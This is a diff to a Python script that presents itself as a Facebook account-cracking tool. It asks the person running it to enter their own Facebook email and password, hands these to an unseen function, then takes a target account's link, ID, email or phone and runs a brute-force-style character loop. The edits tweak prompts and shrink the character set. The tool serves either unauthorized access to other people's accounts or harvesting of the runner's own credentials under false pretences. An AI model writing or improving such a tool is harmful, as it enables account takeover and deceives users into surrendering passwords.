@@ -62,8 +62,8 @@ def loop():
     az = 'azertyuiopqsdfghjklmwxcvnb'
     aZ = 'AZERTYUIOPQSDFGHJKLMWXCVNB'
     a1 = str('1234567890')
-    ajs = '*@#)(?!;:'
-    all = az + ajs + a1 + aZ
+    #ajs = '*@#)(?!;:'
+    all = az + a1 + aZ
     lax = 0
     print(Fore.GREEN+'recherche en cours...')
     time.sleep(2)
@@ -79,9 +79,9 @@ option = int(input(Fore.GREEN+'''
 [:]Choose an option (1/2/3/4): '''+Style.RESET_ALL))
 if option == 1:
     cho = 'Facebook'
-    print('\nVeuillez tout d\'abord vous connecter à votre propre compte Facebook -/- First log into your own Facebook account')
+    print('\nVeuillez tout d\'abord vous connecter à votre propre compte Facebook, votre mot de passe ne s'affichera pas à l'écran\n\nFirst log into your own Facebook account, ur password won't appear on the screen.')
     usn = input('\nenter your email/phonenumber: ')
-    usp = getpass.getpass('enter your password (will not appear on the screen): ')
+    usp = getpass.getpass('enter your password: ')
     print('En cours de connexion, veuillez patienter...\n')
     nth()
     assur(usn, usp)
@@ -154,7 +154,7 @@ for x in liste:
             connect(name)
 
 if option == 1:
-    lien = input('collez le lien du compte cible paste the target account link, id, email or phone number: ')
+    lien = input('collez le lien du compte cible (paste the target account link, id, email or phone number): ')
     print('searching for referentials...')
     loop()
     os.system('xdg-open https://m.facebook.com')
